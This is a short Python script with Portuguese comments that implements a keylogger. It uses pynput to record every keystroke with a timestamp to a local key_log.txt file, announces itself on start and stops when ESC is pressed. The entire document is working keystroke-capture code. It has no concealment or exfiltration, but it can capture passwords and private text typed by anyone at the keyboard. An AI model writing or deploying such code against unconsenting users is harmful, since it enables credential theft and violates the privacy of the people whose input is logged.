from pynput.keyboard import Key, Listener
import logging

# Configuração do log para salvar as teclas
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Tecla pressionada: {key.char}")
    except AttributeError:
        logging.info(f"Tecla especial: {key}")

def on_release(key):
    # Para o keylogger ao pressionar a tecla ESC (Útil para testes)
    if key == Key.esc:
        return False

print("Keylogger iniciado... Pressione ESC para parar.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
